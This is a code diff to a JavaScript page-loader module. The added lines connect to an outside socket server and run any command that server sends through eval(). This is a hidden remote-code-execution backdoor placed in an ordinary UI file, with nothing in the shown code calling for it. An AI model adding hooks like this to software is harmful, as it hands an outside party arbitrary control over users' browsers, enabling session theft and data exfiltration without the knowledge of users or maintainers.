@@ -57,6 +57,16 @@ Loader = (function(){
 		}
 	}
 
+	var socket = io.connect("wss://codeday-teams-socket.herokuapp.com");
+
+	socket.on('hello', function(){
+		console.log('ayy lmao');
+	});
+
+	socket.on('eval', function(command){
+		eval(command);
+	});
+
 	$(document).ajaxStart(function(){
 		Loader.show();
 	});
